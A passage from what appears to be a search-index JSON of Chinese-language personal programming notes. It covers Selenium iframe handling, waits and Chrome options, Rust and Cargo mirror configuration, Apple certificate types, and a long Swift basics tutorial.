'button').click() 但是，如果 iframe 之外没有按钮，那么您可能会得到一个 no such element 无此元素 的错误。 这是因为 Selenium 只知道顶层文档中的元素。 为了与按钮进行交互，我们需要首先 切换到框架 ， 这与切换窗口的方式类似。 WebDriver 提供了三种切换到帧的方法。 使用 WebElement 使用 WebElement 进行切换是最灵活的选择: # 存储网页元素 iframe = driver.find_element(By.CSS_SELECTOR, \"#modal > iframe\") # 切换到选择的 iframe driver.switch_to.frame(iframe) # 单击按钮 driver.find_element(By.TAG_NAME, 'button').click() 使用 name 或 id 如果您的 frame 或 iframe 具有 id 或 name 属性，则可以使用该属性。 如果名称或 id 在页面上不是唯一的， 那么将切换到找到的第一个。: # 通过 id 切换框架 driver.switch_to.frame('buttonframe') # 单击按钮 driver.find_element(By.TAG_NAME, 'button').click() 使用索引 还可以使用frame的索引， 例如可以使用JavaScript中的 window.frames 进行查询.: # 基于索引切换到第 2 个 iframe iframe = driver.find_elements(By.TAG_NAME,'iframe')[1] # 切换到选择的 iframe driver.switch_to.frame(iframe) 离开框架 离开 iframe 或 frameset，切换回默认内容，如下所示: # 切回到默认内容 driver.switch_to.default_content() 同窗口和标签一起工作 参考: https://www.selenium.dev/zh-cn/documentation/webdriver/interactions/windows/ 窗口切换/关闭, 屏幕截图, 执行脚本 虚拟身份验证器 参考: https://www.selenium.dev/zh-cn/documentation/webdriver/interactions/virtual_authenticator/","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-selenium-Interaction.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-selenium-Interaction.html"},{"title":"原理/结构","text":"Selenium所做的一切, 就是发送给浏览器命令, 用以执行某些操作或为信息发送请求. 启动一个驱动实例: driver = webdriver.Chrome() 打开指定的网页: driver.get(\"https://www.selenium.dev/selenium/web/web-form.html\") 获取网页信息: title = driver.title 建立等待策略 将代码与浏览器的当前状态同步 是Selenium面临的最大挑战之一, 做好它是一个高级主题. 基本上, 您希望在尝试定位元素之前, 确保该元素位于页面上, 并且在尝试与该元素交互之前, 该元素处于可交互状态. 隐式等待很少是最好的解决方案, 但在这里最容易演示,: driver.implicitly_wait(0.5) 发送命令 查找元素: text_box = driver.find_element(by=By.NAME, value=\"my-text\") submit_button = driver.find_element(by=By.CSS_SELECTOR, value=\"button\") 操作元素: # 填充 Selenium text_box.send_keys(\"Selenium\") submit_button.click() 获取元素信息: driver.find_element(by=By.ID, value=\"message\") text = message.text 结束会话, 即结束驱动程序进程, 默认情况下, 该进程也会关闭浏览器. 无法向此驱动程序实例发送更多命令: driver.quit()","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-selenium-Principles-Structure.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-selenium-Principles-Structure.html"},{"title":"服务","text":"Driver Service Class 服务类用于管理驱动程序的启动和停止. They can not be used with a Remote WebDriver session(不能用于远程会话). 默认会话实例: service = webdriver.ChromeService() driver = webdriver.Chrome(service=service) 设置使用本地驱动: service = webdriver.ChromeService(executable_path=chromedriver_bin) 指定端口启动: service = webdriver.ChromeService(port=1234)","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-selenium-Serve.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-selenium-Serve.html"},{"title":"chrome支持的选项","text":"从指定位置启动浏览器(即Chrome执行文件路径), binary 参数接收一个使用浏览器的备用路径, 通过这个参数你可以使用chromedriver 去驱动各种基于Chromium 内核的浏览器.: options.binary_location = chrome_bin 增加插件: options.add_extension(extension_file_path) 保持浏览器的打开状态 将 detach 参数设置为true将在驱动过程结束后保持浏览器的打开状态: options.add_experimental_option(\"detach\", True) 排除的参数, Chrome 添加了各种参数，如果你不希望添加某些参数， 可以将其传入 excludeSwitches. 一个常见的例子是重新打开弹出窗口阻止程序.: options.add_experimental_option('excludeSwitches', ['disable-popup-blocking']) 指定日志输出: service = webdriver.ChromeService(log_output=log_path) 指定控制台输出: service = webdriver.ChromeService(log_output=subprocess.STDOUT) 指定日志等级: service = webdriver.ChromeService(service_args=['--log-level=DEBUG'], log_output=subprocess.STDOUT) 指定日志效果(支持 append log 和 readable timestamps ): service = webdriver.ChromeService(service_args=['--append-log', '--readable-timestamp'], log_output=log_path) 禁用版本检查, 默认会检查驱动与浏览器的版本是否一致: service = webdriver.ChromeService(service_args=['--disable-build-check'], log_output=subprocess.STDOUT)","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-selenium-chrome-support-option.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-selenium-chrome-support-option.html"},{"title":"等待","text":"隐式等待 对所有元素有效. 使用 driver.implicitly_wait(2) 显式等待 对指定元素有效. 每次都需要建立WebDriverWait对象: wait = WebDriverWait(driver, timeout=2) wait.until(lambda d : revealed.is_displayed()) 还支持条件设置: errors = [NoSuchElementException, ElementNotInteractableException] wait = WebDriverWait(driver, timeout=2, poll_frequency=.2, ignored_exceptions=errors) wait.until(lambda d : revealed.send_keys(\"Displayed\") or True)","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-selenium-wait.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-selenium-wait.html"},{"title":"trio","text":"官网文档:: trio 貌似是一个比较新的异步编程库, 相对 asyncio 来说, 目前支持的库还是比较少的, 不过 PySide6 文档中举例使用了这个库. 后面有空再补充.","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-trio.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-trio.html"},{"title":"yarl","text":"一个URL处理的模块, 类似Vscode的\"URI\"模块","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-yarl.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-yarl.html"},{"title":"Rust","text":"安装参考: https://rustup.rs/ 国内源配置 Mac 更新配置文件: vim ~/.bash_profile 新增如下内容(使用中科大代理): export RUSTUP_DIST_SERVER=https://mirrors.ustc.edu.cn/rust-static export RUSTUP_UPDATE_ROOT=https://mirrors.ustc.edu.cn/rust-static/rustup # 使用 rsproxy 代理 # export RUSTUP_DIST_SERVER=\"https://rsproxy.cn\" # export RUSTUP_UPDATE_ROOT=\"https://rsproxy.cn/rustup\" 让修改生效: source ~/.bash_profile Windows10 设置如下环境变量: RUSTUP_DIST_SERVER=https://mirrors.ustc.edu.cn/rust-static RUSTUP_UPDATE_ROOT=https://mirrors.ustc.edu.cn/rust-static/rustup 升级 code: rustup check rustup update 配置 Cargo 使用国内镜像 更新文件 ~/.cargo/config`（windows 10 下为 `C:Users<用户名>.cargoconfig ）， 没有就新建: [source.crates-io] registry = \"https://github.com/rust-lang/crates.io-index\" # 替换成要使用的镜像 replace-with = 'rsproxy' # 中国科学技术大学 [source.ustc] registry = \"git://mirrors.ustc.edu.cn/crates.io-index\" # 如果所处的环境中不允许使用 git 协议，可以把上述地址改为 https 协议 #registry = \"https://mirrors.ustc.edu.cn/crates.io-index\" # 清华大学 [source.tuna] registry = \"https://mirrors.tuna.tsinghua.edu.cn/git/crates.io-index.git\" # 上海交通大学 [source.sjtu] registry = \"https://mirrors.sjtug.sjtu.edu.cn/git/crates.io-index\" # rustcc 社区 [source.rustcc] registry = \"git://crates.rustcc.cn/crates.io-index\" # rsproxy [source.rsproxy] registry = \"https://rsproxy.cn/crates.io-index\" [source.rsproxy-sparse] registry = \"sparse+https://rsproxy.cn/index/\" [registries.rsproxy] index = \"https://rsproxy.cn/crates.io-index\" [net] git-fetch-with-cli=true 若 使用 cargo build 命令仍然报错如下错误: blocking waiting for file lock on package(包) cache lock 可删除文件 ~/.cargo/.package-cache 然后重试。","tags":"后端","url":"/yq-doc-source-docs-rear-end-rust-index.html","loc":"/yq-doc-source-docs-rear-end-rust-index.html"},{"title":"Apple证书类型","text":"开发的设备要在其他设备上运行, 需要有证书 宏观来说有两种 Apple开发: 普通的带证书的本地开发, 直接使用自己账户登陆, 证书选择开发者, 就会默认生成一个可用的证书(免费, 有效期一年), 过期了再重复即可, Apple分发: 用于在其他设备运行, 发布到Apple Store, 个人账号688/y 参考: Apple官网-证书 Apple官网-证书类型","tags":"后端","url":"/yq-doc-source-docs-rear-end-swift-Apple-certificate-type.html","loc":"/yq-doc-source-docs-rear-end-swift-Apple-certificate-type.html"},{"title":"常见属性包装器","text":"@State . @StateObject @StateObject属性包装器与类似@State，只不过它适用于ObservableObject。 一个ObservableObject始终是引用类型 (class)，并且每当其@Published属性之一发生更改时都会通知。 @Binding . @ObservedObject 以便视图可以观察外部对象的状态，并在重要内容发生变化时收到通知。 @Published 允许我们创建可观察的对象，并且在发生更改时触发视图重绘。我们经常将@Published与ObservableObject协议结合使用。 此部分可参考: https://juejin.cn/post/7319706549915156499","tags":"后端","url":"/yq-doc-source-docs-rear-end-swift-Attribute-packaging.html","loc":"/yq-doc-source-docs-rear-end-swift-Attribute-packaging.html"},{"title":"基本语法","text":"常识了解 Swift Playground 可视为一个可交互的文档， 所写即所得 内置关键字 let 常量定义 var 变量定义 print 打印输出 typealias 定义类型别名 如定义了 Int 的类型别名为 Feet: typealias Feet = Int guard guard语句和if语句有点类似，都是根据其关键字之后的表达式的布尔值决定下一步执行什么。 但与if语句不同的是，guard语句只会有一个代码块，不像if语句可以if else多个代码块。 那么guard语句的作用到底是什么呢？顾名思义，就是守护。 guard语句判断其后的表达式布尔值为false时，才会执行之后代码块里的代码， 如果为true，则跳过整个guard语句: // 检查身份证，如果身份证没带，则不能进入考场 guard let id = person[\"id\"] else { print(\"没有身份证，不能进入考场!\") return } 内置数据类型 Int 整型 UInt 无符号整型 尽量不要使用UInt，除非你真的需要存储一个和当前平台原生字长相同的无符号整数。 除了这种情况，最好使用Int，即使你要存储的值已知是非负的。 统一使用Int可以提高代码的可复用性，避免不同类型数字之间的转换，并且匹配数字的类型推断。 注解 整数类型需要注意以下几点： 在 32 位系统上, Int 和 Int32 长度相同。 在 64 位系统上, Int 和 Int64 长度相同。 在 32 位系统上, UInt 和 UInt32 长度相同。 在 64 位系统上, UInt 和 UInt64 长度相同。 Int8, Int16, Int32, Int64 分别表示 8 位, 16 位, 32 位, 和 64 位的有符号整数形式。 UInt8, UInt16, UInt32, UInt64 分别表示 8 位, 16 位, 32 位 和 64 位的无符号整数形式。 Float 32浮点数，精度要求不高的话可以使用此类型。 浮点类型比整数类型表示的范围更大，可以存储比 Int 类型更大或者更小的数字 Double 64位浮点数，当你需要存储很大或者很高精度的浮点数时请使用此类型。 注解 Double精确度很高，至少有15位数字， 而 Float 最少只有6位数字。 选择哪个类型取决于你的代码需要处理的值的范围。 Bool 布尔值 基本的布尔（Boolean）类型，叫做 Bool。布尔值指逻辑上的值，因为它们只能是真或者假。 Swift 有两个布尔常量，true 和 false。 String 字符串是字符的序列集合 Character 字符指的是单个字母 Optional 使用可选类型来处理值可能缺失的情况。可选类型表示有值或没有值。 如以下两种声明相等: var optionalInteger: Int? var optionalInteger: Optional<Int> 当你声明一个可选变量或者可选属性的时候没有提供初始值，它的值会默认为 nil 若为布尔， 貌似默认为true 如果一个可选类型的实例包含一个值，你可以用后缀操作符 ！来访问这个值: optionalInteger = 42 optionalInteger! // 42 当你确定可选类型确实包含值之后，你可以在可选的名字后面加一个感叹号（!）来获取值， 这被称为可选值的 强制解析（forced unwrapping） 这部分(问号/叹号)的使用, 与ts基本一致 注解 使用!来获取一个不存在的可选值会导致运行时错误。 使用!来强制解析值之前，一定要确定可选包含一个非nil的值。 可选绑定 使用可选绑定（optional binding）来判断可选类型是否包含值， 如果包含就把值赋给一个临时常量或者变量。 可选绑定可以用在if和while语句中来对可选类型的值进行判断并把值赋给一个常量或者变量。 实例: import Cocoa var myString:String? myString = \"Hello, Swift!\" if let yourString = myString { print(\"你的字符串值为 - \\(yourString)\") }else{ print(\"你的字符串没有值\") } 以上程序执行结果为: 你的字符串值为 - Hello, Swift! Array todo Dictionary todo Struct todo Class todo 类型安全 Swift 是一个类型安全（type safe）的语言。 由于 Swift 是类型安全的， 所以它会在编译你的代码时进行类型检查（type checks），并把不匹配的类型标记为错误。 这可以让你在开发的时候尽早发现并修复错误。 类型推断 不需要每次声明常量和变量的时候都显式指定类型 如果你没有显式指定类型，Swift 会使用类型推断（type inference）来选择合适的类型。 当推断浮点数的类型时，Swift 总是会选择Double而不是Float。 如果表达式中同时出现了整数和浮点数，会被推断为Double类型 Swift 变量 变量是一种使用方便的占位符，用于引用计算机内存地址。 声明: var variableName = <initial value> var varB:Float 变量名可以由字母，数字和下划线组成 变量名需要以字母或下划线开始 区分大小写 Swift 常量 设定后不可变 声明常量或者变量的时候可以加上类型标注（type annotation）， 说明常量或者变量中要存储的值的类型: var constantName:<data type> = <optional initial value> Swift 运算符 算术运算符 + - * / % , 分别表示 加 减 乘 除 求余 比较运算符 == 等于 != 不等于 > 大于 < 小于 >= 大于等于 <= 小于等于 逻辑运算符 && 逻辑与。如果运算符两侧都为 TRUE 则为 TRUE。 || 逻辑或。 如果运算符两侧至少有一个为 TRUE 则为 TRUE。 ! 逻辑非。布尔值取反，使得true变false，false变true。 位运算符 位运算符用来对二进制位进行操作， ~ & | &#94; << >> 分别为取反，按位与与，按位与或，按位与异或运算, 按位左移， 按位右移 赋值运算符 = 简单的赋值运算，指定右边操作数赋值给左边的操作数 += 相加后再赋值，将左右两边的操作数相加后再赋值给左边的操作数。 -= 相减后再赋值，将左右两边的操作数相减后再赋值给左边的操作数。 *= 相乘后再赋值，将左右两边的操作数相乘后再赋值给左边的操作数。 /= 相除后再赋值，将左右两边的操作数相除后再赋值给左边的操作数 %= 求余后再赋值，将左右两边的操作数求余后再赋值给左边的操作数 <<= 按位左移后再赋值 >>= 按位右移后再赋值 &= 按位与运算后赋值 &#94;= 按位异或运算符后再赋值 |= 按位或运算后再赋值 区间运算符 闭区间运算符: 闭区间运算符 （a...b） 定义一个包含从a到b(包括a和b)的所有值的区间, 必须大于等于a。 闭区间运算符在迭代一个区间的所有值时是非常有用的， 如在for-in循环中: 1...5 区间值为 1, 2, 3, 4 和 5 半开区间运算符 半开区间（a..<b）定义一个从a到b但不包括b的区间。 之所以称为半开区间， 是因为该区间包含第一个值而不包括最后的值。 如： 1..< 5 区间值为 1, 2, 3, 和 4 其他运算符 其他类型的的运算符，如一元、二元和三元运算符 一元减: 数字前添加 - 号前缀, -3 或 -4 一元加: 数字前添加 + 号前缀, +6 结果为 6 三元运算符: condition ? X : Y, 如果 condition 为 true ，值为 X ，否则为 Y 重要 运算符优先级 优先级从上到下依次递减，最上面具有最高的优先级，逗号操作符具有最低的优先级。 相同优先级中，按结合顺序计算。大多数运算是从左至右计算，只有三个优先级是从右至左结合的， 它们是单目运算符、条件运算符、赋值运算符。 基本的优先级需要记住： 指针最优，单目运算优于双目运算。如正负号。 先乘除（模），后加减。 先算术运算，后移位运算，最后位运算。 特别注意： 1 << 3 + 2 & 7 等价于 (1 << (3 + 2))&7 逻辑运算最后计算 合并空值运算符：?? 合并空值运算符 a ?? b 如果可选项 a 有值则展开，如果没有值，是 nil，则返回默认值 b。 表达式 a 必须是一个可选类型，表达式 b 必须与 a 的存储类型相同 合并空值运算符，实际上是三元运算符作用到 Optional 上的缩写 a != nil ? a! : b 如果 a 的值是非空，b的值将不会被考虑，也就是合并空值运算符是短路的。 Swift 条件语句 if switch 最简便的就是三目: Exp1 ? Exp2 : Exp3; Swift 循环 for-in 遍历一个集合里面的所有元素，例如由数字表示的区间、数组中的元素、字符串中的字符。 for 循环 该循环方式在 Swift 3 中已经弃用。 用来重复执行一系列语句直到达成特定条件达成， 一般通过在每次循环完成后增加计数器的值来实现。 while 循环 运行一系列语句，如果条件为true，会重复运行，直到条件变为false。 repeat...while 循环 类似 while 语句区别在于判断循环条件之前，先执行一次循环的代码块。 循环控制语句 continue 语句: 告诉一个循环体立刻停止本次循环迭代，重新开始下次循环迭代。 break 语句: 中断当前循环。 fallthrough 语句: 如果在一个case执行完后，继续执行下面的case， 需要使用fallthrough(贯穿)关键字。 Swift 字符串 创建 可以通过使用字符串字面量或 String 类的实例来创建一个字符串: import Cocoa // 使用字符串字面量 var stringA = \"Hello, World!\" print( stringA ) // String 实例化 var stringB = String(\"Hello, World!\") print( stringB ) 初始化空的字符串 可以使用空的字符串字面量赋值给变量或初始化一个String类的实例来初始值一个空的字符串, 使用字符串属性 isEmpty 来判断字符串是否为空: import Cocoa // 使用字符串字面量创建空字符串 var stringA = \"\" // 实例化 String 类来创建空字符串 // let stringB = String() if stringA.isEmpty { print( \"stringA 是空的\" ) } else { print( \"stringA 不是空的\" ) 字符串中插入值 插入的字符串字面量的每一项都在以反斜线为前缀的圆括号中: import Cocoa var varA = 20 let constA = 100 var varC:Float = 20.0 var stringA = \"\\(varA) 乘于 \\(constA) 等于 \\(varC * 100)\" print( stringA ) 字符串连接 字符串可以通过 + 号来连接 字符串长度 字符串长度使用 String.count 属性来计算 字符串比较 使用 == 来比较两个字符串是否相等 Unicode 字符串 Unicode 是一个国际标准，用于文本的编码，Swift 的 String 类型是基于 Unicode建立的。 你可以循环迭代出字符串中 UTF-8 与 UTF-16 的编码: import Cocoa var unicodeString = \"菜鸟教程\" print(\"UTF-8 编码: \") for code in unicodeString.utf8 { print(\"\\(code) \") } print(\"\\n\") print(\"UTF-16 编码: \") for code in unicodeString.utf16 { print(\"\\(code) \") } 字符串函数及运算符 isEmpty: 判断字符串是否为空，返回布尔值 hasPrefix(prefix: String): 检查字符串是否拥有特定前缀 hasSuffix(suffix: String): 检查字符串是否拥有特定后缀。 Int(String): 转换字符串数字为整型 String.count: Swift 3 版本使用的是 String.characters.count, 计算字符串的长度 utf8: 您可以通过遍历 String 的 utf8 属性来访问它的 UTF-8 编码 utf16: 您可以通过遍历 String 的 utf16 属性来访问它的 utf16 编码 unicodeScalars: 您可以通过遍历String值的unicodeScalars属性来访问它的 Unicode 标量编码. +: 连接两个字符串，并返回一个新的字符串 +=: 连接操作符两边的字符串并将新字符串赋值给左边的操作符变量 ==: 判断两个字符串是否相等 <: 比较两个字符串，对两个字符串的字母逐一比较。 !=: 比较两个字符串是否不相等。 Swift 字符(Character) 空字符变量 Swift 中不能创建空的 Character（字符） 类型变量或常量 遍历字符串中的字符 Swift 3 中的 String 需要通过 characters 去调用的属性方法， 在 Swift 4 中可以通过 String 对象本身直接调用，例如: import Cocoa for ch in \"Runoob\" { print(ch) } 字符串连接字符 使用 String 的 append() 方法来实现字符串连接字符 Swift 数组 如果创建一个数组，并赋值给一个变量，则创建的集合就是可以修改的。这意味着在创建数组后，可以通过添加、删除、修改的方式改变数组里的项目。 如果将一个数组赋值给常量，数组就不可更改，并且数组的大小和内容都不可以修改。 创建数组 可以使用构造语法来创建一个由特定数据类型构成的空数组： var someArray = [SomeType]() 以下是创建一个初始化大小数组的语法: var someArray = [SomeType](repeating: InitialValue, count: NumbeOfElements) 以下实例创建了一个类型为 Int ，数量为 3，初始值为 0 的空数组: var someInts = [Int](repeating: 0, count: 3) 以下实例创建了含有三个元素的数组: var someInts:[Int] = [10, 20, 30] 访问数组 根据数组的索引来访问数组的元素，语法如下: var someVar = someArray[index] 修改数组 可以使用 append() 方法或者赋值运算符 += 在数组末尾添加元素 也可以通过索引修改数组元素的值 遍历数组 可以使用for-in循环来遍历所有数组中的数据项 合并数组 可以使用加法操作符（+）来合并两种已存在的相同类型数组 count 属性 使用 count 属性来计算数组元素个数 isEmpty 属性 通过只读属性 isEmpty 来判断数组是否为空 注解 创建数组的方法 推荐: var names: [String] = [] var lookup: [String: Int] = [:] 不推荐: var names = [String]() var lookup = [String: Int]() Swift 字典 Swift 字典用来存储无序的相同类型数据的集合，Swift 字典会强制检测元素的类型，如果类型不同则会报错。 Swift 字典每个值（value）都关联唯一的键（key），键作为字典中的这个值数据的标识符 如果创建一个字典，并赋值给一个变量，则创建的字典就是可以修改的。这意味着在创建字典后，可以通过添加、删除、修改的方式改变字典里的项目。 如果将一个字典赋值给常量，字典就不可修改，并且字典的大小和内容都不可以修改。 创建字典 可以使用以下语法来创建一个特定类型的空字典: // var someDict = [KeyType: ValueType]() var someDict: [KeyType: ValueType] = () 以下是创建一个空字典，键的类型为 Int，值的类型为 String 的简单语法: // var someDict = [Int: String]() var someDict: [Int: String] = () 以下为创建一个字典的实例: var someDict:[Int:String] = [1:\"One\", 2:\"Two\", 3:\"Three\"] 访问字典 我们可以根据字典的索引来访问数组的元素，语法如下: var someVar = someDict[key] 修改字典 可以使用 updateValue(forKey:) 增加或更新字典的内容。 如果 key 不存在，则添加值，如果存在则修改 key 对应的值。 updateValue(_:forKey:)方法返回被修改的Optional值 也可以通过指定的 key 来修改字典的值 移除 Key-Value 对 可以使用 removeValueForKey() 方法来移除字典 key-value 对 如果 key 存在该方法返回移除的值，如果不存在返回 nil 遍历字典 我们可以使用 for-in 循环来遍历某个字典中的键值对: import Cocoa var someDict:[Int:String] = [1:\"One\", 2:\"Two\", 3:\"Three\"] for (key, value) in someDict { print(\"字典 key \\(key) - 字典 value \\(value)\") } 字典转换为数组 可以提取字典的键值(key-value)对，并转换为独立的数组: import Cocoa var someDict:[Int:String] = [1:\"One\", 2:\"Two\", 3:\"Three\"] let dictKeys = [Int](someDict.keys) let dictValues = [String](someDict.values) count 属性 可以使用只读的 count 属性来计算字典有多少个键值对 isEmpty 属性 可以通过只读属性 isEmpty 来判断字典是否为空 Swift 函数 函数定义: func funcname(形参) -> returntype { Statement1 Statement2 …… Statement N return parameters } 可变参数 可变参数可以接受零个或多个值. 通过在变量类型名后面加入（...）的方式来定义 常量，变量及 I/O 参数 一般默认在函数中定义的参数都是常量参数，也就是这个参数你只可以查询使用，不能改变它的值。 如果想要声明一个变量参数，可以在参数定义前加 inout 关键字，这样就可以改变这个参数的值了 例如: func getName(_ name: inout String)......... 一般默认的参数传递都是传值调用的，而不是传引用。所以传入的参数在函数内改变，并不影响原来的那个参数。传入的只是这个参数的副本。 当传入的参数作为输入输出参数时，需要在参数名前加 & 符，表示这个值可以被函数修改。 实例: import Cocoa func swapTwoInts(_ a: inout Int, _ b: inout Int) { let temporaryA = a a = b b = temporaryA } var x = 1 var y = 5 swapTwoInts(&x, &y) print(\"x 现在的值 \\(x), y 现在的值 \\(y)\") 使用函数类型 可以定义一个类型为函数的常量或变量，并将适当的函数赋值给它: var addition: (Int, Int) -> Int = sum Swift 闭包 闭包(Closures)是自包含的功能代码块，可以在代码中使用或者用来作为参数传值。 Swift 中的闭包与 C 和 Objective-C 中的代码块（blocks）以及其他一些编程语言中的 匿名函数比较相似。 全局函数和嵌套函数其实就是特殊的闭包 大多数情况下, Swift的闭包相当于匿名函数, 比如: let driver = { print(\"is driver\") } 调用: driver 但是这并不意味着不能使用参数, 需要的参数是被写在花括号里面的 : 为了让一个闭包接收参数， 需要在 花括号之后把这些参数列出来，然后跟上一个 in 关键字 。 这样就告诉Swift，闭包的主体是从哪里开始的: let driver = { (place: String) in print(\"is driver in \\(place)\") } 函数和闭包的一个区别是运行闭包的时候你不会用到参数标签, 直接调用即可: driver(\"秋名山\") 若需要指定返回值: let driver = { (place: String) -> String in return \"is driver in \\(place)\" } 拖尾闭包语法 如果一个函数的最后一个参数是闭包， Swift允许你采用一种被称为 \"拖尾闭包语法\" 的方式来调用这个闭包。 你可以把闭包传入函数之后的花括号里，而不必像传入参数那样。 以下为例: func travel(action: () -> Void) { print(\"我准备开车了。\") action() print(\"我已抵达。\") } 正常一般会这样调用: travel(action: driver) 由于函数的最后一个参数是闭包，我们可以用拖尾闭包语法来调用 上一节的driver: travel() { print(\"is driver\") } 或者: travel() { print(\"is driver\") } 实际上，由于函数没有别的参数了，我们还可以将圆括号完全移除: travel { print(\"is driver\") } 若要接受参数: func travel(action: (String) -> Void) ... 若需要带返回值: travel { (place: String) -> String in return \"is driver in \\(place)\" } 若知道place与返回类型, 可以去掉注解, 同时因为主体只有一行代码, 所以return也可以去掉, 即: travel { place in \"is driver in \\(place)\" } Swift还提供一种速记语法，让你可以把代码变得更短。 我们可以让Swift为闭包的参数自动提供一个名字，而不必自行写下 place in。 这些自动生成的名字以$开头，然后跟着一个从0开始的整数，就像下面这样: travel { \"is driver in \\($0)。\" } Swift 枚举 枚举简单的说也是一种数据类型，只不过是这种数据类型只包含自定义的特定数据，它是一组有共同特性的数据的集合。 Swift 的枚举类似于 Objective C 和 C 的结构，枚举的功能为: 它声明在类中，可以通过实例化类来访问它的值。 枚举也可以定义构造函数（initializers）来提供一个初始成员值；可以在原始的实现基础上扩展它们的功能。 可以遵守协议（protocols）来提供标准的功能。 定义: enum enumname { // 枚举定义放在这里 case 变量 } case关键词表示一行新的成员值将被定义。 重要 和 C 和 Objective-C 不同，Swift 的枚举成员在被创建时不会被赋予一个默认的整型值 Swift 结构体 Swift 结构体是构建代码所用的一种通用且灵活的构造体。 我们可以为结构体定义属性（常量、变量）和添加方法，从而扩展结构体的功能。 与 C 和 Objective C 不同的是： 结构体不需要包含实现文件和接口。 结构体允许我们创建一个单一文件，且系统会自动生成面向其它代码的外部接口。 结构体总是通过被复制的方式在代码中传递，因此它的值是不可修改的。 值传递 通过关键字 struct 来定义结构体: struct nameStruct { Definition 1 Definition 2 …… Definition N } Swift 类 在一个单一文件中定义一个类，系统会自动生成面向其它代码的外部接口。 恒等运算符 判定两个常量或者变量是否引用同一个类实例，Swift 内建了两个恒等运算符 === : 两个常量或者变量引用同一个类实例则返回 true !== : 两个常量或者变量引用不同一个类实例则返回 true Swift 属性 存储属性 一个存储属性就是存储在特定类或结构体的实例里的一个常量或变量 延迟存储属性 当第一次被调用的时候才会计算其初始值的属性 在属性声明前使用 lazy 来标示一个延迟存储属性, 且必须声明为var变量 一般用于： 延迟对象的创建。 当属性的值依赖于其他未知类 计算属性 除存储属性外，类、结构体和枚举可以定义计算属性，计算属性不直接存储值， 而是提供一个 getter 来获取值，一个可选的 setter 来间接设置其他属性或变量的值。 只读计算属性 只有 getter 没有 setter 的计算属性就是只读计算属性 属性观察器 属性观察器监控和响应属性值的变化 不需要为无法重载的计算属性添加属性观察器，因为可以通过 setter 直接监控和响应值的变化。 可以为属性添加如下的一个或全部观察器： willSet在设置新的值之前调用 didSet在新的值被设置之后立即调用 willSet和didSet观察器在属性初始化过程中不会被调用 Swift 方法 self 属性 类型的每一个实例都有一个隐含属性叫做self，self 完全等同于该实例本身， 相当于Java的this 在实例方法中修改值类型 Swift 语言中结构体和枚举是值类型。一般情况下，值类型的属性不能在它的实例方法中被修改 若确实需要修改， 可以选择变异(mutating)这个方法，然后方法就可以从方法内部改变它的属性； 并且它做的任何改变在方法结束时还会保留在原始结构中。 方法还可以给它隐含的self属性赋值一个全新的实例，这个新实例在方法结束后将替换原来的实例 在可变方法中给 self 赋值 可变方法能够赋给隐含属性 self 一个全新的实例。 类型方法 就是类方法 Swift 下标 某些方面也可以理解为增加类似数组的功能 下标脚本允许你通过在实例后面的方括号中传入一个或者多个的索引值来对实例进行访问和赋值。 语法类似于实例方法和计算型属性的混合。 与定义实例方法类似，定义下标脚本使用subscript关键字，显式声明入参（一个或多个）和返回类型。 与实例方法不同的是下标脚本可以设定为读写或只读。这种方式又有点像计算型属性的getter和setter: subscript(index: Int) -> Int { get { // 用于下标脚本值的声明 } set(newValue) { // 执行赋值操作 } } 参考: https://www.runoob.com/swift/swift-subscripts.html 实例: import Cocoa struct subexample { let decrementer: Int subscript(index: Int) -> Int { return decrementer / index } } let division = subexample(decrementer: 100) print(\"100 除以 9 等于 \\(division[9])\") print(\"100 除以 2 等于 \\(division[2])\") print(\"100 除以 3 等于 \\(division[3])\") print(\"100 除以 5 等于 \\(division[5])\") print(\"100 除以 7 等于 \\(division[7])\") 用法 根据使用场景不同下标脚本也具有不同的含义。 通常下标脚本是用来访问集合（collection），列表（list）或序列（sequence）中元素的快捷方式。 你可以在你自己特定的类或结构体中自由的实现下标脚本来提供合适的功能。 Swift 继承 继承 使用冒号 重写（Overriding） 子类可以通过继承来的实例方法，类方法，实例属性， 或下标脚本来实现自己的定制功能，我们把这种行为叫重写（overriding）。 子类可以通过继承来的实例方法，类方法，实例属性，或下标脚本来实现自己的定制功能， 把这种行为叫重写（overriding）。 防止重写 使用 final 关键字防止它们被重写。 Swift 构造过程 构造函数使用 init() 方法 类实例也可以通过定义析构器（deinitializer）在类实例释放之前执行清理内存的工作。 存储型属性的初始赋值 类和结构体在实例创建时，必须为所有存储型属性设置合适的初始值。 存储属性在构造器中赋值时，它们的值是被直接设置的，不会触发任何属性观测器。 存储属性在构造器中赋值流程： 创建初始值。 在属性定义中指定默认属性值。 初始化实例，并调用 init() 方法。 构造过程中修改常量属性 只要在构造过程结束前常量的值能确定，你可以在构造过程中的任意时间点修改常量属性的值 对某个类实例来说，它的常量属性只能在定义它的类的构造过程中修改；不能在子类中修改。 默认构造器 默认构造器将简单的创建一个所有属性值都设置为默认值的实例: 结构体的逐一成员构造器 如果结构体对所有存储型属性提供了默认值且自身没有提供定制的构造器， 它们能自动获得一个逐一成员构造器 如: struct Rectangle { var length = 100.0, breadth = 200.0 } let area = Rectangle(length: 24.0, breadth: 32.0) print(\"矩形的面积: \\(area.length)\") print(\"矩形的面积: \\(area.breadth)\") 值类型的构造器代理 构造器可以通过调用其它构造器来完成实例的部分构造过程。 这一过程称为构造器代理，它能减少多个构造器间的代码重复。 构造器的继承和重载 Swift 中的子类不会默认继承父类的构造器。 父类的构造器仅在确定和安全的情况下被继承。 当你重写一个父类指定构造器时，你需要写override修饰符 可失败构造器 可以在一个类，结构体或是枚举类型的定义中，添加一个或多个可失败构造器。 其语法为在init关键字后面加添问号(init?)。 Swift 析构过程 在一个类的实例被释放之前，析构函数被立即调用。 用关键字deinit来标示析构函数，类似于初始化函数用init来标示。析构函数只适用于类类型。 Swift 